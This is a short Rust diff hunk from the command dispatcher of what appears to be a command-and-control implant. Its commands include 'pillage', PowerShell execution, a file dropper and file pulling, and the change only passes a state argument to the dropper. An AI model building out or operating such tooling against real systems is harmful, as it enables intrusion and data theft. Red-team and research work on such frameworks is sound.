@@ -68,7 +68,7 @@ async fn dispatcher(
         ["ls"] => dir_listing(creds, &agent).await,
         ["pillage"] => pillage(creds, &agent).await,
         ["run", args @ ..] => run_powershell_command(args, creds, &agent).await,
-        ["drop", args @ ..] => file_dropper(args, creds, &agent).await,
+        ["drop", args @ ..] => file_dropper(args, creds, &agent, state).await,
         ["cp", _pat @ ..] | ["copy", _pat @ ..] => copy_file(raw_input, creds, &agent).await,
         ["mv", _pat @ ..] | ["move", _pat @ ..] => move_file(raw_input, creds, &agent).await,
         ["pull", _pat @ ..] => pull_file(raw_input, creds, &agent).await,
